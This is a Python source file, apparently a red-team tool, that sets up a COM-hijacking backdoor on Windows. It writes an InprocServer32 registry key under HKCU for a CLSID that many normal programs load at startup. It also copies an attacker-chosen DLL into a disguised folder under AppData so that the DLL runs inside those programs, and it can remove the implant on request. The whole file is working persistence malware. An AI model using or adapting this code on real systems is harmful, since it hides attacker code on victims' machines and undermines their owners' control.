#!/usr/bin/python3
# -*- coding: utf-8 -*-
# @Time    : 2020.02.05
# @Author  : Lhaihai
# @File    : com_Hijack
# @Software: PyCharm
# @Blog    : http://www.Lhaihai.top
"""
    Description : 通过修改CLSID下的注册表键值，实现对CAccPropServicesClass和MMDeviceEnumerator劫持，而系统很多正常程序启动时需要调用这两个实例
"""

import pyregedit.pyregedit as pyregedit
from logger import factory_logger
logger = factory_logger('com_Hijack')
import shutil
import os
import sys

defaultpath = 'C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Installer\\{BCDE0395-E52F-467C-8E3D-C4579291692E}'

def init():
    root = pyregedit.HKEY_CURRENT_USER
    path = r"Software\Classes\CLSID\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}"
    reg = pyregedit.RegEdit(root,path)
    if reg.check_key():
        path = r"Software\Classes\CLSID\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\InprocServer32"
        reg = pyregedit.RegEdit(root, path)
        if reg.check_key():
            pass
        else:
            reg.create_key()
            logger.info('创建了InprocServer32')
    else:
        reg.create_key()
        path = r"Software\Classes\CLSID\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\InprocServer32"
        reg = pyregedit.RegEdit(root,path)
        reg.create_key()
        logger.info('创建了InprocServer32')
    return reg


def set_com_Hijack(cmd):

    dst = r'C:\Users\Administrator\AppData\Roaming\Microsoft\Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}\\'+os.path.basename(cmd)
    reg = init()
    try:
        if os.path.isdir(defaultpath):
            shutil.copy(cmd, dst)
        else:
            os.makedirs(defaultpath)
            shutil.copy(cmd, dst)
            logger.info('创建了{BCDE0395-E52F-467C-8E3D-C4579291692E}目录')
        reg.create_value('',pyregedit.REG_SZ,cmd)
        reg.create_value('ThreadingModel',pyregedit.REG_SZ,'Apartment')
        logger.info('插入注册表成功')
    except Exception as e:
        logger.error('插入注册表失败')

def clear_com_Hijack():

    root = pyregedit.HKEY_CURRENT_USER
    path = r"Software\Classes\CLSID\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}"
    reg = pyregedit.RegEdit(root, path)

    if reg.check_key():
        try:
            reg.delete_sub_key('InprocServer32')
            reg.delete_current_key()
            if os.path.isdir(defaultpath):
                shutil.rmtree(defaultpath)
            else:
                pass
            logger.info('清除成功')
        except:
            logger.error('清除失败')
    else:
        logger.info('该后门没有植入')
        return


if __name__ == '__main__':
    action = sys.argv[1] if len(sys.argv)>1 else ''
    if action == 'set':
        cmd = sys.argv[2]
        # cmd = r'c:\calcmutex_x64.dll'
        if ':' not in cmd and '\\' not in cmd:
            path = os.getcwd() + '\\' + cmd
            if os.path.exists(path):
                set_com_Hijack(path)
            else:
                logger.error(cmd+'文件不存在')
        else:
            set_com_Hijack(cmd)
    elif action == 'clear':
        clear_com_Hijack()
    else:
        print('com_Hijack_64.exe set calcmutex_x64.dll')
        print('com_Hijack_64.exe clear')
